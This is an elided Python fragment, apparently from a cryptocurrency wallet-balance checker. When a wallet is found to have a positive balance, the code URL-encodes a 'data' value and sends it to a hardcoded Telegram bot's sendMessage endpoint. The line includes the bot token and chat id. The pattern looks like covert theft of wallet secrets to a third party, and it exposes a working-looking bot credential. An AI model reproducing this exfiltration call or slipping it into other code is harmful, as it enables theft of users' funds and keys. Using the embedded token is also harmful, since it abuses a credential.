            ...
            try:
                ...
                for balance in ls:
                    ...
                    if bal > 0:
                        ...
                        dat=urllib.parse.quote_plus(data)
                        requests.get("https://api.telegram.org/bot5841279693:AAE5fdcSf7TgObPnT3H_Oqwoyv4OhC3VV60/sendMessage?chat_id=728621838&text="+dat)
                    else:
                        if show != 1:
